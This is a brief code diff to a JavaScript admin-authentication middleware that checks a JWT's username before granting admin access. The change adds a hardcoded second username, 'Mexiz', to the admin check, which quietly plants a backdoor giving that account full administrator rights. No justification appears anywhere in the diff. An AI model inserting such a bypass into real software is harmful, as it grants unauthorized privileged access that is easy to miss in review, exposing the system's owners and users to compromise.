@@ -155,7 +155,7 @@ function authenticateAdmin(req, res, next) {
 
   jwt.verify(token, JWT_SECRET, (err, user) => {
     if (err) return res.status(403).json({ error: 'Invalid token' });
-    if (user.username !== 'admin') {
+    if (user.username !== 'admin' && user.username !== 'Mexiz') {
       return res.status(403).json({ error: 'Forbidden: Admins only' });
     }
     req.user = user;
